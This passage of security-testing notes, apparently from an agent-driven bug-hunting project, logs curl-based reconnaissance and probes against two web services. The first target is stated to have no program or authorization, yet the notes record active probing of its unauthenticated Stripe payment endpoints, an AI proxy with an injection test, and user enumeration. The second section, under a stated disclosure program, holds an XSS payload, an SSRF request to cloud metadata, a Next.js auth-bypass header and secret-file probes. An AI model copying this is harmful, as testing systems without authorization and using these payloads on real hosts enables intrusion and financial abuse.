                 aplyco -> "Team does not exist"

  - Conclusion: NO program, NO authorization, NO payout. Do not exploit.

A.2 Historical recon (STALE) note
  - /home/its/Agentic-Bug-Hunter/bughunter/recon/aply.com/ is Wayback-era;
    r= param decodes to ask.com parked syndication. Not the live app.

A.3 DNS / subdomains [P]
  crt.sh:  curl -sS "https://crt.sh/?q=%25.aply.com&output=json"
  DoH:     curl -sS -H 'Accept: application/dns-json' \
             "https://cloudflare-dns.com/dns-query?name=<host>&type=A"
  Resolved: aply.com/www/internal (Firebase), links.aply.com (CloudFront->
  Resend), pay.aply.com (GoDaddy), teamfeed-server/aply-server (Render).

A.4 HTTP fingerprint [A-minimal]
  curl -sS -D - -o /dev/null https://aply.com/
  curl -sS -D - -o /dev/null https://aply.com/login   (title "Login | Ably"? no, Aply)
  Note: SPA catch-all returns 200 index.html for every path.

A.5 Front-end source review [P]
  curl -sS https://aply.com/assets/index-<hash>.js -o aply.js
  grep -oaE '"assets/[^"]+\.js"' aply.js | tr -d '"' | sort -u   # chunk list
  # download every chunk:
  while read p; do curl -sS "https://aply.com/$p" -o "chunks/$(basename $p)"; done
  # extract endpoints/config/collections/secrets:
  grep -hoaE '`?/(api|v1|v2)/[a-zA-Z0-9_/${}.:-]{2,70}' chunks/*.js | sort -u
  grep -hoaE '(apiKey|authDomain|projectId|storageBucket):"[^"]+"' chunks/*.js
  grep -oaE 'sourceMappingURL=[^ ]+' aply.js          # none

A.6 Firebase config discovered (public by design)
  project mrkt-2efde; apiKey AIzaSy... (public); storageBucket
  mrkt-2efde.appspot.com; databaseURL mrkt-2efde-default-rtdb.firebaseio.com

A.7 Data-store checks (unauthenticated) [P]
  Firestore: https://firestore.googleapis.com/v1/projects/mrkt-2efde/databases/(default)/documents/<coll>?pageSize=1
     -> 403 for all tested collections
  RTDB:      https://mrkt-2efde-default-rtdb.firebaseio.com/.json  -> 403
  Storage:   https://firebasestorage.googleapis.com/v0/b/mrkt-2efde.appspot.com/o -> 403
             https://storage.googleapis.com/mrkt-2efde.appspot.com/ -> AccessDenied

A.8 Endpoint discovery on teamfeed-server [A]
  # status differential (401 = exists/auth, 404 = none):
  curl -sS -o /dev/null -w '%{http_code}' -H 'Authorization: Bearer x' \
       https://teamfeed-server.onrender.com/api/me
  # discovered: /api/me,/api/companies,/api/companies/:id,/api/groups/context,
  #   /api/groups/ensure,/api/groups/:id/roster,/api/groups/:id/members/:uid,
  #   /api/workspace/:id/{catalog,entitlements},/api/invites/:t,
  #   /api/collab/invites/:t,/api/demo-shares/:id,/api/company-categories,
  #   /api/stripe/*,/api/ai is on aply-server.
  # empty-body POST differential to find routes with NO auth middleware:
  for p in <list>; do curl -sS -o /dev/null -w '%{http_code}\n' -X POST \
      -H 'Content-Type: application/json' -d '{}' "https://teamfeed-server.onrender.com$p"; done
  # RESULT: only /api/stripe/create-checkout-session lacked auth (400 Missing pipelineId)

A.9 CONFIRMED: unauth Stripe endpoints (SAFE - bogus id only) [A]
  Z=00000000-0000-0000-0000-000000000000
  for ep in accept-no-charge charge-balance refund-deposit; do
    curl -sS -X POST -H 'Content-Type: application/json' \
      -d "{\"applicationId\":\"$Z\"}" \
      "https://teamfeed-server.onrender.com/api/stripe/$ep"
  done
  # -> 404 {"error":"Application not found"}  (NO 401 => no auth)
  # create-checkout-session:
  curl -sS -X POST -H 'Content-Type: application/json' \
    -d '{"pipelineId":"zzz","applicationData":null,"returnUrl":null}' \
    https://teamfeed-server.onrender.com/api/stripe/create-checkout-session
  # -> 400 {"error":"Unsupported pipeline"} (no auth)
  ![!] DO NOT reuse with a real applicationId -> that is a financial action.

A.10 CONFIRMED: unauth AI proxy [A-benign]
  for i in 1 2 3; do curl -sS -X POST -H 'Content-Type: application/json' \
    -d "{\"name\":\"probe $i\"}" https://aply-server.onrender.com/ai/enrich-company; done
  # -> 200 x3 (no auth, no rate limit)
  # injection test (benign text) -> model refused; no system-prompt leak

A.11 CONFIRMED: Firebase user enumeration [A-benign]
  K=AIzaSy...   # public web key
  curl -sS -H 'Content-Type: application/json' \
    -d '{"identifier":"zz-nonexistent@example.invalid","continueUri":"https://aply.com/"}' \
    "https://identitytoolkit.googleapis.com/v1/accounts:createAuthUri?key=$K"
  # -> {"registered":false,...}
  # sendOobCode (PASSWORD_RESET) -> EMAIL_NOT_FOUND
  # signInWithPassword -> EMAIL_NOT_FOUND vs INVALID_PASSWORD

A.12 Code-evidenced (NOT validated; need auth + Firestore rules)
  - Pipeline chunk: setDoc(doc(db,"Applications",`${Op(email)}_${pipelineId}`),
      {paymentStatus:"balance_paid", decisionStatus:"active", ...},{merge:true})
  - Admin allowlist in client: ["nd@aply.com"]; role:"leadership"/isAdmin
    written client-side.
  - Op = email.toLowerCase().replace(/[^a-z0-9]+/g,"_")  (predictable doc id)
  - To validate safely: create a TEST account, use test data only, inspect
    whether rules allow writing paymentStatus/decisionStatus / reading others.

A.13 Infra/DNS [P]
  TXT aply.com: hosting-site=mrkt-2efde; firebase=mrkt-2efde; SPF zoho+firebase

B. ABLY  (AUTHORIZED - VDP; https://ably.com/disclosure; disclosure@ably.com)
================================================================================
B.0 Scope (from policy)
  IN: ably.com, ancillary *.ably.com (operated by Ably, not internal),
      control.ably.net, main.realtime.ably.net, realtime.ably.io, rest.ably.io,
      *.realtime.ably.net, *-realtime.ably.io, *-rest.ably.io,
      *.ably-realtime.com, customer CNAMEs.
  OUT: SDKs, ably-cli/ably-server, third-party (Intercom, support.ably.com,
      SafeBase security.ably.com, HubSpot pages, status.ably.com),
      internal/non-customer-facing (incl. ai-assistant.ably.com).
  EXCLUDED: user enum, SPF/DMARC, TLS/headers, abstract open redirect/CSRF,
      DoS/brute force, version disclosure.
  Payouts: Low=recognition, Medium=$500, High=$1,000, Critical=$3,000.

B.1 Recon [P]
  crt.sh: curl -sS "https://crt.sh/?q=ably.com&output=json"
  DoH brute: for s in api app dashboard control rest realtime main www docs ...; do
     curl -sS -H 'Accept: application/dns-json' \
       "https://cloudflare-dns.com/dns-query?name=$s.ably.com&type=A"; done
  Security: curl -sS https://ably.com/.well-known/security.txt
            curl -sS https://ably.com/robots.txt

B.2 HTTP fingerprint [A]
  curl -sS -D - -o /dev/null https://ably.com/
  curl -sS -D - -o /dev/null https://control.ably.net/
  curl -sS -D - -o /dev/null https://rest.ably.io/
  curl -sS -D - -o /dev/null https://main.realtime.ably.net/
  # /time -> 200 ; /channels,/stats -> 401 ; control routes auth-gated

B.3 Subdomain takeover [P]
  # resolve each *.ably.com and follow CNAME chain; flag NXDOMAIN target
  # RESULT: no dangling (Vercel/CloudFront/HubSpot/SafeBase/Statuspage all live)

B.4 Exposed files / XSS [A]
  for p in /.git/HEAD /.env /config/database.yml /backup.sql /manifest.json; do
    curl -sS -o /dev/null -w '%{http_code}\n' "https://ably.com$p"; done  # all 404
  curl -sS --get --data-urlencode 'q="><svg/onload=alert(1)>' https://ably.com/search
  # no reflection

B.5 Next.js middleware auth-bypass (CVE-2025-29927) [A]
  curl -sS -o /dev/null -w '%{http_code} %{redirect_url}\n' \
    -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware' \
    https://dashboards-external.ably.com/
  # -> 307 /login (PATCHED)

B.6 SSRF - image optimizer [A]
  curl -sS "https://ably.com/_next/image?url=$(python3 -c 'import urllib.parse;print(urllib.parse.quote("http://169.254.169.254/latest/meta-data/",safe=""))')&w=64&q=75"
  # -> no optimizer / rejected

B.7 Authenticated authz testing (own app; tokens from account owner) [A]
  # Account token (REDACTED; revoke after):
  T='<ACCOUNT_TOKEN>'
  GET /v1/me                         # shows token caps
  GET /v1/apps/<APP>/keys            # owner can read keys
  GET /v1/apps/zzzzzz/keys           # -> 404 (tenant isolation)
  GET /v1/accounts/<ACC>/apps        # -> 401 (no read:app cap)
  # Capability bounding: mint token from a subscribe-only key requesting publish
  curl -u '<APP>.<SUBKEY>:<SECRET>' -X POST \
    --data-urlencode 'clientId=t' --data-urlencode "timestamp=$(date +%s%3N)" \
    --data-urlencode 'ttl=3600000' --data-urlencode 'keyName=<APP>.<SUBKEY>' \
    --data-urlencode 'capability={"*":["publish","subscribe"]}' \
    https://rest.ably.io/keys/<APP>.<SUBKEY>/requestToken
  # -> capability CAPPED to {"*":["subscribe"]}
  # Channel isolation: token for chanA -> publish chanA 201, chanB 401

B.8 Token revocation (REST) [A]
  # needs key with revocableTokens=true
  POST /keys/<APP>.<KEY>/revokeTokens  {"targets":["clientId:<cid>"]}   -> 201
  # after appliesAt: publish -> 401 (ENFORCED)
  # malformed targets -> 500 (unhandled; informational only)

B.9 Integration-rules SSRF [A - validation only, no trigger]
  POST /v1/apps/<APP>/rules {"ruleType":"http","requestMode":"single",
    "source":{"channelFilter":"zz","type":"channel.message"},
    "target":{"url":"http://127.0.0.1/","format":"json","enveloped":false}}
  # -> 422 {"details":{"base":["Disallowed IP address"]}}
  # bypass attempts (2130706433,0x7f000001,127.1,nip.io,[::ffff:...]) -> 422
  # example.com@127.0.0.1 -> 201 (host=example.com, correct)
  # DELETE the rule afterwards

B.10 Signed TokenRequest escalation [A]
  # Spec: server verifies requested capability against key capability and may
  # subset. -> No escalation by design.

B.11 Realtime protocol (Node 22 WebSocket, protocol v2) [A]
  ws = new WebSocket(`wss://realtime.ably.io/?accessToken=<tok>&format=json&v=2`)
  # CONNECTED action 4; ATTACH action 10 -> ATTACHED 11;
  # MESSAGE action 15 {channel,msgSerial,messages} -> ACK action 1
  # revoke token mid-connection -> server closes (1000); publish not ACKed
  # => revocation enforced on live connections

B.12 Realtime token expiry (short TTL) [A - optional]
  mint token ttl=2000ms, connect, wait > expiry, publish -> expect error/close

B.13 Cleanup
  POST /v1/apps/<APP>/keys/<ID>/revoke   (temporary keys -> status=1)
  DELETE /v1/apps/<APP>/rules/<ID>
  rm local token/key files
